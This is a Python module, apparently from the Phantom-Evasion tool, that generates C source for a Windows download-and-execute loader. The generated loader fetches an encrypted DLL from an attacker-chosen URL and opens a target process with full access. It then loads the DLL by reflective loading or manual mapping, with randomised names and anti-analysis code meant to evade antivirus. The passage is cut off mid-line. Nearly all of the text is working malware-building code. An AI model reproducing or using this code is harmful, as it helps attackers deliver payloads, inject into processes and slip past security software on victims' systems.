
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #    along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.          #
     #                                                                                      #
     ########################################################################################

import sys
sys.path.append("Modules/payloads/auxiliar")

import inject_utils

from usefull import CryptFile
from usefull import varname_creator
from usefull import WindowsDefend
from usefull import JunkInjector
from usefull import WindowsDecoyProc
from usefull import CloseDecoyProc
from usefull import CheckForBackslash
from usefull import IncludeShuffler
from usefull import WriteSource


def DownloadExecDll_C_windows(ModOpt):

    UrlTarget = ModOpt["UrlTarget"]
    Filesize = ModOpt["Filesize"]

    RandvarFsize = varname_creator()
    RandhProcess = varname_creator()
    Randentry = varname_creator()
    RandProcsnapshot = varname_creator()
    Randlpv = varname_creator()
    Randpointer = varname_creator()
    RandhInternet = varname_creator()
    RandhURL = varname_creator()
    RandvarBRead = varname_creator()
    RandvarBWritten = varname_creator()
    RandisRead = varname_creator()
    Randflag = varname_creator()
    RandhThread = varname_creator()
    Randlpv2 = varname_creator()

    ModOpt["Lpvoid"] = Randlpv

    CryptFile(ModOpt)

    if ModOpt["ExecMethod"] in ["ReflectiveDll","RD","RDAPC","RDTC"]:

        RandRvaParam = varname_creator()
        RandBaseAddrParam = varname_creator()
        RandFuncRva2Offset = varname_creator()
        RandIndex = varname_creator()
        RandSectHeader = varname_creator()
        RandNtHeader = varname_creator()
        RandBaseAddr = varname_creator()
        RandExportDir = varname_creator()
        RandArrName = varname_creator()
        RandArrAddr = varname_creator()
        RandOrdName = varname_creator()
        RandLoaderOffset = varname_creator()
        RandExportedFunc = varname_creator()
        RandCounter = varname_creator()

    elif ModOpt["ExecMethod"] in ["ManualMap","MM"]:

        RandLoadLib = varname_creator()
        RandGetProcAddr = varname_creator()
        RandPdllMain = varname_creator()
        RandLoadStruct = varname_creator()
        RandImgDosHeader = varname_creator()
        RandImgNTHeader = varname_creator()
        RandImgSectHeader = varname_creator()
        RandhModule = varname_creator()
        Randflag2 = varname_creator()
        RandvarFunc = varname_creator()
        RandvarList = varname_creator()
        RandImgImport = varname_creator()
        RandvarEntry = varname_creator()
        RandvarDelta = varname_creator()
        RandPtrLoader = varname_creator()
        RandImgBaseReloc = varname_creator()
        RandImgImportDesc = varname_creator()
        RandFirstT = varname_creator()
        RandOrigFirstT = varname_creator()
        RandImgEntryTls = varname_creator()
        RandTlsDir = varname_creator()
        RandCallback = varname_creator()
        RandLoaderMem = varname_creator()


    Ret_code = ""

    IncludeList = ["#include <stdlib.h>\n","#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <time.h>\n","#include <math.h>\n"]

    Ret_code += IncludeShuffler(IncludeList) + "#include <tlhelp32.h>\n"

    Ret_code += "#include <wininet.h>\n"

    if ModOpt["ExecMethod"] in ["ReflectiveDll","RD","RDAPC","RDTC"]:

        Ret_code += "DWORD " + RandFuncRva2Offset + "( DWORD " + RandRvaParam + ", UINT_PTR " + RandBaseAddrParam + " ){\n"
        Ret_code += "WORD " + RandIndex + " = 0;\n"
        Ret_code += "PIMAGE_SECTION_HEADER " + RandSectHeader + " = NULL;\n"
        Ret_code += "PIMAGE_NT_HEADERS " + RandNtHeader + " = NULL;\n"
        Ret_code += RandNtHeader + " = (PIMAGE_NT_HEADERS)(" + RandBaseAddrParam + " + ((PIMAGE_DOS_HEADER)" + RandBaseAddrParam + ")->e_lfanew);\n"
        Ret_code += RandSectHeader + " = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&" + RandNtHeader + "->OptionalHeader) + " + RandNtHeader + "->FileHeader.SizeOfOptionalHeader);\n"
        Ret_code += "if( " + RandRvaParam + " < " + RandSectHeader + "[0].PointerToRawData )\n"
        Ret_code += "return " + RandRvaParam + ";\n"
        Ret_code += "for( " + RandIndex + "=0 ; " + RandIndex + " < " + RandNtHeader + "->FileHeader.NumberOfSections ; " + RandIndex + "++ ){\n"
        Ret_code += "if( " + RandRvaParam + " >= " + RandSectHeader + "[" + RandIndex + "].VirtualAddress && " + RandRvaParam + " < (" + RandSectHeader + "[" + RandIndex + "].VirtualAddress + " + RandSectHeader + "[" + RandIndex + "].SizeOfRawData) )\n"
        Ret_code += "return ( " + RandRvaParam + " - " + RandSectHeader + "[" + RandIndex + "].VirtualAddress + " + RandSectHeader + "[" + RandIndex + "].PointerToRawData );}\n"
        Ret_code += "return 0;}\n"

    elif ModOpt["ExecMethod"] in ["ManualMap","MM"]:

        Ret_code += "typedef HMODULE (WINAPI * " + RandLoadLib + ")(LPCSTR);\n"
        Ret_code += "typedef FARPROC (WINAPI * " + RandGetProcAddr+ ")(HMODULE,LPCSTR);\n"
        Ret_code += "typedef BOOL (WINAPI * " + RandPdllMain + ")(HMODULE,DWORD,LPVOID);\n"
        #Ret_code += "typedef BOOL (NTAPI *pRtlAddFunctionTable)(PRUNTIME_FUNCTION,DWORD,DWORD64);\n"

        Ret_code += "typedef struct _" + RandLoadStruct + "{"
        Ret_code += "LPVOID ImageBase;"
        Ret_code += "PIMAGE_NT_HEADERS NtHeaders;"
        Ret_code += "PIMAGE_BASE_RELOCATION BaseRelocation;"
        Ret_code += "PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;"
        Ret_code += RandLoadLib + " fnLoadLibraryA;"
        Ret_code += RandGetProcAddr+ " fnGetProcAddress;"
        #Ret_code += "pRtlAddFunctionTable fnRtlAddFunctionTable;\n"
        Ret_code += "}" + RandLoadStruct + ",*P" + RandLoadStruct + ";\n"

        Ret_code += "static SIZE_T WINAPI LoadDll(LPVOID p){\n"
        Ret_code += "P" + RandLoadStruct + " " + RandPtrLoader+ " = (P" + RandLoadStruct + ")p;\n"
        Ret_code += "HMODULE " + RandhModule + ";\n"
        Ret_code += "DWORD " + Randflag2 + "," + Randflag + ";\n"
        Ret_code += "DWORD " + RandvarFunc + ";\n"
        Ret_code += "PWORD " + RandvarList + ";\n"
        Ret_code += "PIMAGE_IMPORT_BY_NAME " + RandImgImport + ";\n"
        Ret_code += RandPdllMain + " " + RandvarEntry+ ";\n"
        Ret_code += "SIZE_T " + RandvarDelta+ ";\n"
        Ret_code += RandvarDelta+ "=(SIZE_T)((LPBYTE)" + RandPtrLoader+ "->ImageBase-" + RandPtrLoader+ "->NtHeaders->OptionalHeader.ImageBase);\n"
        Ret_code += "if(" + RandvarDelta+ " != 0){\n"
        Ret_code += "PIMAGE_BASE_RELOCATION " + RandImgBaseReloc+ " = " + RandPtrLoader+ "->BaseRelocation;\n"
        Ret_code += "while(" + RandImgBaseReloc+ "->VirtualAddress){\n"
        Ret_code += "if(" + RandImgBaseReloc+ "->SizeOfBlock>=sizeof(IMAGE_BASE_RELOCATION)){\n"
        Ret_code += Randflag + "=(" + RandImgBaseReloc+ "->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);\n"
        Ret_code += RandvarList + "=(PWORD)(" + RandImgBaseReloc+ "+1);\n"
        Ret_code += "for(" + Randflag2 + "=0;" + Randflag2 + "<" + Randflag + ";" + Randflag2 + "++){\n"
        Ret_code += "if(" + RandvarList + "[" + Randflag2 + "]){\n"
        Ret_code += "PDWORD ptr=(PDWORD)((LPBYTE)" + RandPtrLoader+ "->ImageBase+(" + RandImgBaseReloc+ "->VirtualAddress+(" + RandvarList + "[" + Randflag2 + "] & 0xFFF)));\n"
        Ret_code += "*ptr+=" + RandvarDelta+ ";}}}\n"
        Ret_code += RandImgBaseReloc+ "=(PIMAGE_BASE_RELOCATION)((LPBYTE)" + RandImgBaseReloc+ "+" + RandImgBaseReloc+ "->SizeOfBlock);}}\n"
        Ret_code += "PIMAGE_IMPORT_DESCRIPTOR " + RandImgImportDesc+ " = " + RandPtrLoader+ "->ImportDirectory;\n"
        Ret_code += "PIMAGE_THUNK_DATA " + RandFirstT+ "," + RandOrigFirstT+ ";\n"
        Ret_code += "while(" + RandImgImportDesc+ "->Characteristics){\n"
        Ret_code += RandOrigFirstT + "=(PIMAGE_THUNK_DATA)((LPBYTE)" + RandPtrLoader+ "->ImageBase+" + RandImgImportDesc+ "->OriginalFirstThunk);\n"
        Ret_code += RandFirstT+ "=(PIMAGE_THUNK_DATA)((LPBYTE)" + RandPtrLoader+ "->ImageBase+" + RandImgImportDesc+ "-> FirstThunk);\n"
        Ret_code += RandhModule + "=" + RandPtrLoader+ "->fnLoadLibraryA((LPCSTR)" + RandPtrLoader+ "->ImageBase+" + RandImgImportDesc+ "->Name);\n"
        Ret_code += "while(" + RandOrigFirstT+ "->u1.AddressOfData){\n"
        Ret_code += "if(" + RandOrigFirstT+ "->u1.Ordinal & IMAGE_ORDINAL_FLAG){\n"
        Ret_code += RandvarFunc + "=(DWORD)" + RandPtrLoader+ "->fnGetProcAddress(" + RandhModule + ",(LPCSTR)(" + RandOrigFirstT+ "->u1.Ordinal & 0xFFFF)); \n"
        Ret_code += RandFirstT+ "->u1.Function=" + RandvarFunc + ";}\n"
        Ret_code += "else{\n"
        Ret_code += RandImgImport + "=(PIMAGE_IMPORT_BY_NAME)((LPBYTE)" + RandPtrLoader+ "->ImageBase+" + RandOrigFirstT+ "->u1.AddressOfData);\n"
        Ret_code += RandvarFunc + "=(DWORD)" + RandPtrLoader+ "->fnGetProcAddress(" + RandhModule + ",(LPCSTR)" + RandImgImport + "->Name);\n"
        Ret_code += RandFirstT+ "->u1.Function=" + RandvarFunc + ";}\n"
        Ret_code += RandOrigFirstT+ "++;\n"
        Ret_code += RandFirstT+ "++;}" + RandImgImportDesc+ "++;}\n"
        #Ret_code += "IMAGE_DATA_DIRECTORY " + RandImgEntryTls+ " = " + RandPtrLoader+ "->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];\n"
        #Ret_code += "if(" + RandImgEntryTls+ ".VirtualAddress != 0){\n"
        #Ret_code += "PIMAGE_TLS_DIRECTORY " + RandTlsDir+ " = (PIMAGE_TLS_DIRECTORY)((LPBYTE)" + RandPtrLoader+ "->ImageBase + " + RandImgEntryTls+ ".VirtualAddress);\n"
        #Ret_code += "PIMAGE_TLS_CALLBACK *" + RandCallback+ " = (PIMAGE_TLS_CALLBACK *)" + RandTlsDir+ "->AddressOfCallBacks;\n"
        #Ret_code += "if(" + RandCallback+ "){\n"
        #Ret_code += "while (*" + RandCallback+ "){\n"
        #Ret_code += "(*" + RandCallback+ ")((HMODULE)" + RandPtrLoader + "->ImageBase, DLL_PROCESS_ATTACH, NULL);\n"
        #Ret_code += RandCallback+ "++;}}}\n"

        Ret_code += "if(" + RandPtrLoader+ "->NtHeaders->OptionalHeader.AddressOfEntryPoint){\n"
        Ret_code += RandvarEntry+ "=( " + RandPdllMain + ")((LPBYTE)" + RandPtrLoader+ "->ImageBase+" + RandPtrLoader+ "->NtHeaders->OptionalHeader.AddressOfEntryPoint);\n"
        Ret_code += "return " + RandvarEntry+ "((HMODULE)(" + RandPtrLoader+ "->ImageBase),DLL_PROCESS_ATTACH,NULL);}\n"
        Ret_code += "return TRUE;}\n"

        Ret_code += "static SIZE_T WINAPI LoadDllEnd(){return 0;}\n"

    #Ret_code += "#define CountRelocationEntries(dwBlockSize) (dwBlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY)\n"

    if ModOpt["Outformat"] == "exe":

        Ret_code += "int main(int argc,char * argv[]){\n"

    elif ModOpt["Outformat"] == "dll":

        Ret_code += "BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD dwReason,LPVOID lpReserved){\n"
        Ret_code += "BOOL bReturnValue = TRUE;\n"
        Ret_code += "if(dwReason ==  DLL_PROCESS_ATTACH){\n"

    Ret_code += "$:START\n"

    Ret_code += WindowsDefend(ModOpt)

    #Ret_code += WindowsDecoyProc(ModOpt["DecoyProc"])

    Ret_code += "$:EVA\n"

    Ret_code += "PROCESSENTRY32 " + Randentry + ";\n"
    Ret_code += Randentry + ".dwSize = sizeof(PROCESSENTRY32);\n"

    if ModOpt["DynImport"] == True:

        ModOpt["NtdllHandle"] = varname_creator()
        ModOpt["Ker32Handle"] = varname_creator()
        Wininet = varname_creator()
        NdcTl32Snapshot = varname_creator()
        NdcProcess32First = varname_creator()
        NdcProcess32Next = varname_creator()
        NdcOpenProcess = varname_creator()

        Ret_code += "HANDLE " + ModOpt["NtdllHandle"] + " = GetModuleHandle(\"ntdll.dll\");\n"
        Ret_code += "HANDLE " + ModOpt["Ker32Handle"] + " = GetModuleHandle(\"kernel32.dll\");\n"
        Ret_code += "HANDLE " + Wininet + " = GetModuleHandle(\"wininet.dll\");\n" 
        Ret_code += "FARPROC " + NdcTl32Snapshot + " = GetProcAddress(" + Wininet + ", \"CreateToolhelp32Snapshot\");\n"
        Ret_code += "FARPROC " + NdcProcess32First + " = GetProcAddress(" + Wininet + ", \"Process32First\");\n"
        Ret_code += "FARPROC " + NdcProcess32Next + " = GetProcAddress(" + Wininet + ", \"Process32Next\");\n"
        Ret_code += "HANDLE " + RandProcsnapshot + " = (HANDLE)" + NdcTl32Snapshot + "(TH32CS_SNAPPROCESS, 0);\n"
        Ret_code += "if(" + NdcProcess32First + "(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
        Ret_code += "while(" + NdcProcess32Next + "(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
        Ret_code += "if(strcmp(" + Randentry + ".szExeFile,\"" + ModOpt["ProcTarget"] + "\") == 0){\n"
        Ret_code += "FARPROC " + NdcOpenProcess + " = GetProcAddress(" + Wininet + ", \"OpenProcess\");\n"
        Ret_code += "HANDLE " + RandhProcess + " = (HANDLE)" + NdcOpenProcess + "(PROCESS_ALL_ACCESS, FALSE," + Randentry + ".th32ProcessID);\n"

    else:

        Ret_code += "HANDLE " + RandProcsnapshot + " = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n"
        Ret_code += "if (Process32First(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
        Ret_code += "while (Process32Next(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
        Ret_code += "if(strcmp(" + Randentry + ".szExeFile,\"" + ModOpt["ProcTarget"] + "\") == 0){\n"
        Ret_code += "HANDLE " + RandhProcess + " = OpenProcess(PROCESS_ALL_ACCESS, FALSE," + Randentry + ".th32ProcessID);\n"


    Ret_code += "int " + RandvarFsize + " = " + ModOpt["Filesize"] + ";\n"
    Ret_code += "DWORD " + RandvarBWritten +  " = 0;\n"

    if ModOpt["DynImport"] == True:

        NdcInternetOpenA = varname_creator()
        NdcInternetOpenUrl = varname_creator()
        NdcVirtualAlloc = varname_creator()
        NdcInternetReadFile = varname_creator()

        Ret_code += "FARPROC " + NdcInternetOpenA + " = GetProcAddress(" + Wininet + ", \"InternetOpenA\");\n"
        Ret_code += "HINTERNET " + RandhInternet + " = (HINTERNET)" + NdcInternetOpenA + "(\"Mozilla/4.0\", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);\n"
        Ret_code += "if(" + RandhInternet + " != NULL){\n"
        Ret_code += "FARPROC " + NdcInternetOpenUrl + " = GetProcAddress(" + Wininet + ", \"InternetOpenUrl\");\n"
        Ret_code += "HINTERNET " + RandhURL + " = (HINTERNET)" + NdcInternetOpenUrl + "(" + RandhInternet + ",\"" + UrlTarget + "\",NULL, 0,INTERNET_FLAG_RESYNCHRONIZE | INTERNET_FLAG_NO_CACHE_WRITE, 0);\n"
        Ret_code += "FARPROC " + NdcVirtualAlloc + " = GetProcAddress(" + Wininet + ", \"VirtualAlloc\");\n"
        Ret_code += "unsigned char * " + Randlpv + " = (LPVOID)" + NdcVirtualAlloc + "(0," + RandvarFsize + ", MEM_COMMIT, PAGE_READWRITE);\n"
        Ret_code += "ZeroMemory(" + Randlpv + "," + RandvarFsize + ");\n"
        Ret_code += "char * " + Randpointer + " = " + Randlpv + ";\n"
        Ret_code += "DWORD " + RandvarBRead + ";\n"
        Ret_code += "do{\n"
        Ret_code += "FARPROC " + NdcInternetReadFile + " = GetProcAddress(" + Wininet + ", \"InternetReadFile\");\n"
        Ret_code += "BOOL " + RandisRead + " = " + NdcInternetReadFile + "(" + RandhURL + "," + Randpointer + ", 1024, &" + RandvarBRead + ");\n"
    else:

        Ret_code += "HINTERNET " + RandhInternet +  " = InternetOpenA(\"Mozilla/4.0\", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);\n"
        Ret_code += "if(" + RandhInternet +  " != NULL){\n"
        Ret_code += "HINTERNET " + RandhURL + " = InternetOpenUrl(" + RandhInternet +  ",\"" + ModOpt["UrlTarget"] + "\",NULL, 0,INTERNET_FLAG_RESYNCHRONIZE | INTERNET_FLAG_NO_CACHE_WRITE, 0);\n"
        Ret_code += "unsigned char * " + Randlpv +  " = VirtualAlloc(0," + RandvarFsize + ", MEM_COMMIT, PAGE_READWRITE);\n"
        Ret_code += "ZeroMemory(" + Randlpv +  "," + RandvarFsize + ");\n"
        Ret_code += "char * " + Randpointer +  " = " + Randlpv +  ";\n"
        Ret_code += "DWORD " + RandvarBRead +  ";\n"
        Ret_code += "do{\n"
        Ret_code += "BOOL RandisRead = InternetReadFile(" + RandhURL + "," + Randpointer +  ", 1024, &" + RandvarBRead +  ");\n"

    Ret_code += Randpointer +  " += " + RandvarBRead +  ";\n"
    Ret_code += "}while(" + RandvarBRead +  " > 0);\n"

    if ModOpt["Decoder"] != "False":

        Ret_code += ModOpt["Decoder"]

    if ModOpt["ExecMethod"] in ["ReflectiveDll","RD","RDAPC","RDTC"]:

        Ret_code += "UINT_PTR " + RandBaseAddr +  " = (UINT_PTR)" + Randlpv +  ";\n"
        Ret_code += "UINT_PTR " + RandExportDir +  " = " + RandBaseAddr +  " + ((PIMAGE_DOS_HEADER)" + RandBaseAddr +  ")->e_lfanew;\n"
        Ret_code += "UINT_PTR " + RandArrName +  " = (UINT_PTR)&((PIMAGE_NT_HEADERS)" + RandExportDir +  ")->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];\n"
        Ret_code += RandExportDir +  " = " + RandBaseAddr +  " + " + RandFuncRva2Offset + "(((PIMAGE_DATA_DIRECTORY)" + RandArrName +  ")->VirtualAddress, " + RandBaseAddr +  " );\n"
        Ret_code += RandArrName +  " = " + RandBaseAddr +  " + " + RandFuncRva2Offset + "(((PIMAGE_EXPORT_DIRECTORY)" + RandExportDir +  ")->AddressOfNames, " + RandBaseAddr +  " );\n"
        Ret_code += "UINT_PTR " + RandArrAddr +  " = " + RandBaseAddr +  " + " + RandFuncRva2Offset + "(((PIMAGE_EXPORT_DIRECTORY)" + RandExportDir +  ")->AddressOfFunctions, " + RandBaseAddr +  " );\n"
        Ret_code += "UINT_PTR " + RandOrdName +  " = " + RandBaseAddr +  " + " + RandFuncRva2Offset + "(((PIMAGE_EXPORT_DIRECTORY)" + RandExportDir +  ")->AddressOfNameOrdinals, " + RandBaseAddr +  " );\n"
        Ret_code += "DWORD " + RandCounter +  " = ((PIMAGE_EXPORT_DIRECTORY)" + RandExportDir +  ")->NumberOfNames;\n"
        Ret_code += "DWORD " + RandLoaderOffset +  ";\n"
        Ret_code += "while( " + RandCounter +  "-- ){\n"
        Ret_code += "char * " + RandExportedFunc +  " = (char *)(" + RandBaseAddr +  " + " + RandFuncRva2Offset + "(*(DWORD *)(" + RandArrName +  ")," + RandBaseAddr +  "));\n"
        Ret_code += "if(strstr( " + RandExportedFunc +  ", \"ReflectiveLoader\" ) != NULL){\n"
        Ret_code += RandArrAddr +  " = " + RandBaseAddr +  " + " + RandFuncRva2Offset + "(((PIMAGE_EXPORT_DIRECTORY)" + RandExportDir +  ")->AddressOfFunctions, " + RandBaseAddr +  " );\n"
        Ret_code += RandArrAddr +  " += (*(WORD *)(" + RandOrdName +  ")*sizeof(DWORD));\n"
        Ret_code += RandLoaderOffset +  " = " + RandFuncRva2Offset + "(*(DWORD *)(" + RandArrAddr +  ")," + RandBaseAddr + ");}\n"
        Ret_code += RandArrName +  " += sizeof(DWORD);\n"
        Ret_code += RandOrdName +  " += sizeof(WORD);}\n"

        if ModOpt["DynImport"] == True:

            NdcVirt